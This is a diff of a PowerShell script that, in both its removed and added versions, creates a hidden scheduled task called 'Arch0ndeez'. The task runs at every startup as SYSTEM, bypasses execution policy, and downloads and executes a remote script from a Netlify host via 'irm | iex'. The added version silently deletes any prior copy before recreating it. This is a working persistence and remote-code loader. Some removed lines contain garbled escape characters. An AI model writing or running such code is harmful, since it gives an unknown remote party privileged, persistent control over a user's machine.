@@ -1,27 +1,9 @@
-# Define your variables here
-$TaskName = "Arch0ndeez"
-$ScriptUrl = "https://ahmadsan.netlify.app/SetExt.ps1"
+Write-Host "Setting up scheduled task: Arch0ndeez..."
 
-# 1. Check for Administrator privileges
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Warning "Administrator rights required! Please run PowerShell as Administrator."
-    Exit
-}
+# Delete the existing task if it's already there (avoids duplicate errors)
+cmd.exe /c "schtasks /delete /tn Arch0ndeez /f >nul 2>nul"
 
-Write-Host "Setting up scheduled task: $TaskName..."
+# Create the new task using native Windows schtasks
+schtasks /create /f /tn "Arch0ndeez" /sc onstart /ru SYSTEM /rl HIGHEST /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'irm https://link.netlify.app/script.ps1 | iex'"
 
-# 2. Clean up the existing task to prevent duplication errors
-if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
-    Write-Host "Found existing task. Updating it..."
-    Unregister-ScheduledTask -TaskName \(TaskName -Confirm:\)false
-}
-
-# 3. Create the new scheduled task parameters (using safer string concatenation)
-\(TaskArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm ' +\)ScriptUrl + ' | iex"'
-\(action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument\)TaskArgs
-$trigger = New-ScheduledTaskTrigger -AtStartup
-
-# 4. Register the task
-Register-ScheduledTask -TaskName \(TaskName -Action\)action -Trigger $trigger -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force
-
-Write-Host "Success! The task '$TaskName' is now active." -ForegroundColor Green
+Write-Host "Success! The task Arch0ndeez is now active." -ForegroundColor Green
